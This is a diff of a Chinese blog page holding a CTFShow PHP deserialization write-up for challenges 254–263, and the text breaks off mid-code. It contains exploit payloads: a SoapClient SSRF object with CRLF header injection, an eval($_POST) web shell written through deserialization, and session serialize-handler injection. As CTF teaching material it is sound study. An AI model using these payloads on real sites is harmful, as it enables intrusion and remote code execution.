@@ -4,13 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFShow反序列化, Jlan&#39;s Little World">
+    <meta name="keywords" content="CTFShow反序列化, J1an&#39;s Little World">
     <meta name="description" content="反序列化序列化的概念：把一个对象转为字符串
 序列化的好处：
 1、有利于数据存储
 2、方便数据传递
 序列化后字符串的格式
-123Public属性序列化后格式：成员名Private属性序列化后格式：%00类名%00成员名Protect属性序列化">
+Public属性序列化后格式：成员名
+Private属性序列化后格式：%00类名%00成员名
+Protect属性序列化后">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +24,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFShow反序列化 | Jlan&#39;s Little World</title>
+    <title>CTFShow反序列化 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -50,8 +52,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -69,7 +69,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -90,55 +90,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -173,7 +129,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -196,55 +152,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -404,6 +316,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -414,15 +329,37 @@
 <p>1、有利于数据存储</p>
 <p>2、方便数据传递</p>
 <p>序列化后字符串的格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Public属性序列化后格式：成员名</span><br><span class="line">Private属性序列化后格式：%00类名%00成员名</span><br><span class="line">Protect属性序列化后格式：%00*%00成员名</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Public属性序列化后格式：成员名
+Private属性序列化后格式：%00类名%00成员名
+Protect属性序列化后格式：%00*%00成员名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>O:对象类名长度:”对象类名”:对象属性个数{属性名类型:属性名长度:”属性名字”;属性类型:属性长度:”属性内容”}</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PHP序列化与反序列化方法：</span><br><span class="line"><span class="number">1</span>、__construct 当一个对象被创建时调用</span><br><span class="line"><span class="number">2</span>、__destruct 当一个对象被销毁时调用</span><br><span class="line"><span class="number">3</span>、__toString 当一个对象被当作一个字符串时使用</span><br><span class="line"><span class="number">4</span>、__sleep 在对象被序列化之前运行</span><br><span class="line"><span class="number">5</span>、__wakeup 在对象被反序列化之后调用</span><br><span class="line">__construct</span><br><span class="line"><span class="comment">// 触发条件，构造函数，当构造一个对象时调用。</span></span><br><span class="line"><span class="comment">// 对象创建时销毁</span></span><br><span class="line">__destruct</span><br><span class="line"><span class="comment">// 触发条件，析构函数，对象销毁时被调用。</span></span><br><span class="line"><span class="comment">// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容</span></span><br><span class="line">__unserialize</span><br><span class="line"><span class="comment">// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup</span></span><br><span class="line">__sleep</span><br><span class="line"><span class="comment">// 在对象被序列化之前运行</span></span><br><span class="line">__wakeup</span><br><span class="line"><span class="comment">// 在对象被反序列化之后被调用</span></span><br><span class="line">__invoke</span><br><span class="line"><span class="comment">// 当对象被调用时执行</span></span><br><span class="line"><span class="comment">// 函数形式调用对象时，触发的方法</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>序列化与反序列化方法：
+<span class="token number">1</span>、__construct 当一个对象被创建时调用
+<span class="token number">2</span>、__destruct 当一个对象被销毁时调用
+<span class="token number">3</span>、__toString 当一个对象被当作一个字符串时使用
+<span class="token number">4</span>、__sleep 在对象被序列化之前运行
+<span class="token number">5</span>、__wakeup 在对象被反序列化之后调用
+__construct
+<span class="token comment">// 触发条件，构造函数，当构造一个对象时调用。</span>
+<span class="token comment">// 对象创建时销毁</span>
+__destruct
+<span class="token comment">// 触发条件，析构函数，对象销毁时被调用。</span>
+<span class="token comment">// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容</span>
+__unserialize
+<span class="token comment">// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup</span>
+__sleep
+<span class="token comment">// 在对象被序列化之前运行</span>
+__wakeup
+<span class="token comment">// 在对象被反序列化之后被调用</span>
+__invoke
+<span class="token comment">// 当对象被调用时执行</span>
+<span class="token comment">// 函数形式调用对象时，触发的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <p><strong>254</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?username=xxxxx&amp;password=xxxxx</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:?username&#x3D;xxxxx&amp;password&#x3D;xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>按照题中全等于直接构造即可</p>
 <p><strong>255-257</strong></p>
@@ -431,23 +368,101 @@
 <p>过滤了<code>O:数字</code>的形式，在冒号后加+即可，URLdecode会自动解析成连接的</p>
 <p><strong>259</strong></p>
 <p>什么玩意跳过了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//flag.php
+$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+array_pop($xff);
+$ip = array_pop($xff);
+
+if($ip!=='127.0.0.1')&#123;
+	die('error');
+&#125;else&#123;
+	$token = $_POST['token'];
+	if($token=='ctfshow')&#123;
+		file_put_contents('flag.txt',$flag);
+	&#125;
+&#125;
+
+//index.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//vip can get flag one key</span>
+<span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>灰溜溜的回来看WP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PHP中原生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoapClient</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* Methods */</span></span><br><span class="line">    <span class="keyword">public</span> __construct(?<span class="keyword">string</span> <span class="variable">$wsdl</span>, <span class="keyword">array</span> <span class="variable">$options</span> = [])</span><br><span class="line">    <span class="keyword">public</span> __call(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> __doRequest(</span><br><span class="line">        <span class="keyword">string</span> <span class="variable">$request</span>,</span><br><span class="line">        <span class="keyword">string</span> <span class="variable">$location</span>,</span><br><span class="line">        <span class="keyword">string</span> <span class="variable">$action</span>,</span><br><span class="line">        <span class="keyword">int</span> <span class="variable">$version</span>,</span><br><span class="line">        <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span></span><br><span class="line">    ): ?<span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __getCookies(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> __getFunctions(): ?<span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> __getLastRequest(): ?<span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __getLastRequestHeaders(): ?<span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __getLastResponse(): ?<span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __getLastResponseHeaders(): ?<span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __getTypes(): ?<span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> __setCookie(<span class="keyword">string</span> <span class="variable">$name</span>, ?<span class="keyword">string</span> <span class="variable">$value</span> = <span class="literal">null</span>): <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> __setLocation(?<span class="keyword">string</span> <span class="variable">$location</span> = <span class="literal">null</span>): ?<span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __setSoapHeaders(SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> __soapCall(</span><br><span class="line">        <span class="keyword">string</span> <span class="variable">$name</span>,</span><br><span class="line">        <span class="keyword">array</span> <span class="variable">$args</span>,</span><br><span class="line">        ?<span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span>,</span><br><span class="line">        SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span>,</span><br><span class="line">        <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span></span><br><span class="line">    ): <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;PHP中原生类
+class SoapClient &#123;
+    &#x2F;* Methods *&#x2F;
+    public __construct(?string $wsdl, array $options &#x3D; [])
+    public __call(string $name, array $args): mixed
+    public __doRequest(
+        string $request,
+        string $location,
+        string $action,
+        int $version,
+        bool $oneWay &#x3D; false
+    ): ?string
+    public __getCookies(): array
+    public __getFunctions(): ?array
+    public __getLastRequest(): ?string
+    public __getLastRequestHeaders(): ?string
+    public __getLastResponse(): ?string
+    public __getLastResponseHeaders(): ?string
+    public __getTypes(): ?array
+    public __setCookie(string $name, ?string $value &#x3D; null): void
+    public __setLocation(?string $location &#x3D; null): ?string
+    public __setSoapHeaders(SoapHeader|array|null $headers &#x3D; null): bool
+    public __soapCall(
+        string $name,
+        array $args,
+        ?array $options &#x3D; null,
+        SoapHeader|array|null $inputHeaders &#x3D; null,
+        array &amp;$outputHeaders &#x3D; null
+    ): mixed
+&#125;
+&#x2F;&#x2F;可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">在构造SoapClient类时，传入数组参数为：</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://链接&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://链接/文件&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;UA头&#x27;</span>)</span><br><span class="line">该类的__call方法可构造请求使其对指定URL发起POST请求</span><br><span class="line">所以构造该类代码如下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line">   <span class="comment">/*相当于构造出以下请求</span></span><br><span class="line"><span class="comment">   User-Agent: ctfshow</span></span><br><span class="line"><span class="comment">   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1</span></span><br><span class="line"><span class="comment">   Content-Type:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">   Content-Length:13</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   token=ctfshow</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="comment">//由于Content-Length已经确定，所以后面该类自行构造的请求头失效</span></span><br><span class="line">   <span class="variable">$s</span>=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line">   <span class="keyword">echo</span> serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">在构造SoapClient类时，传入数组参数为：
+array('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')
+该类的__call方法可构造请求使其对指定URL发起POST请求
+所以构造该类代码如下
+
+
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+   <span class="token variable">$ua</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow"</span><span class="token punctuation">;</span>
+   <span class="token comment">/*相当于构造出以下请求
+   User-Agent: ctfshow
+   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1
+   Content-Type:application/x-www-form-urlencoded
+   Content-Length:13
+   
+   token=ctfshow
+   */</span>
+   <span class="token comment">//由于Content-Length已经确定，所以后面该类自行构造的请求头失效</span>
+   <span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token variable">$ua</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>260</strong></p>
 <p>就输入那串字符就行</p>
 <p><strong>261</strong></p>
 <p>知识点：在7.4以上版本反序列化会绕过__wakeup()函数</p>
 <p>$this-&gt;code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字877，构造时使用877开头的文件即可，最终构造内容如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;kkk&#x27;]);?&gt;&quot;</span>;</span><br><span class="line">  <span class="comment">//这里记得转译，不然会让你传入kkk参数的</span></span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$s</span>=<span class="keyword">new</span> ctfshowvip();</span><br><span class="line">   <span class="keyword">echo</span> serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//无语Windows Defence把我文件删了😅</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+   class ctfshowvip&#123;
+      public $username&#x3D;&quot;877.php&quot;;
+      public $password&#x3D;&quot;&lt;?php eval(\$_POST[&#39;kkk&#39;]);?&gt;&quot;;
+  &#x2F;&#x2F;这里记得转译，不然会让你传入kkk参数的
+      public $code;
+   &#125;
+   $s&#x3D;new ctfshowvip();
+   echo serialize($s);
+?&gt;
+&#x2F;&#x2F;无语Windows Defence把我文件删了😅<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>262</strong></p>
 <p>简单轻松解法：</p>
@@ -456,34 +471,170 @@
 <p><strong>263</strong></p>
 <p>菜狗直接wp</p>
 <p>首先看</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="comment">//明显limti写错了，所以这个代码永远执行的是$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span></span><br><span class="line"><span class="comment">//所以我们就可以控制session中的内容</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;index.php
+$_SESSION[&#39;limti&#39;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);
+&#x2F;&#x2F;明显limti写错了，所以这个代码永远执行的是$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);
+&#x2F;&#x2F;所以我们就可以控制session中的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>知识点：session在存储时有两种形式，一种是php，一种是php_serialize</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;jlan&quot;</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="variable">$s</span>=<span class="keyword">new</span> user();</span><br><span class="line">	<span class="comment">//php存储：user|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line">	<span class="comment">//php_serialize存储：a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+	class user&#123;
+      public $name&#x3D;&quot;jlan&quot;;
+      public $pass&#x3D;&quot;123456&quot;;
+  &#125;
+	$s&#x3D;new user();
+	&#x2F;&#x2F;php存储：user|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;
+	&#x2F;&#x2F;php_serialize存储：a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>发现诡异的点了吗，在php存储中，｜是用来分离变量名和序列化后的内容的，所以只要我们构造出序列化好的内容并且在前面加｜就可以让程序进行自动反序列化</p>
 <p>继续查看inc/inc.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//inc/inc.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span 